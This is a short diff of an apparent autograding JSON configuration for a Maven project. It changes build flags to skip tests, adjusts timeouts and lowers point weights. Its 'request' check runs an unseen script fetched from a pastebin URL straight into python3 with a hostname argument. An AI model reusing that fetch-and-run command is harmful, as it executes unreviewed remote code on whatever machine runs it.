@@ -3,12 +3,12 @@
     {
       "name": "Maven",
       "setup": "",
-      "run": "mvn package",
+      "run": "mvn package -Dmaven.test.skip -q",
       "input": "",
       "output": "",
       "comparison": "exact",
-      "timeout": 10,
-      "points": 5
+      "timeout": 15,
+      "points": 3
     },
     {
       "name": "hostname check",
@@ -18,17 +18,17 @@
       "output": "",
       "comparison": "exact",
       "timeout": 10,
-      "points": 5
+      "points": 3
     },
     {
       "name": "request",
       "setup": "",
-      "run": " curl https://pastebin.com/raw/TQtfL2HL | python3 - $(cat hostname)",
+      "run": " curl -s https://pastebin.com/raw/TQtfL2HL | python3 - $(cat hostname)",
       "input": "",
       "output": "",
       "comparison": "exact",
       "timeout": 10,
-      "points": 90
+      "points": 4
     }
   ]
 }
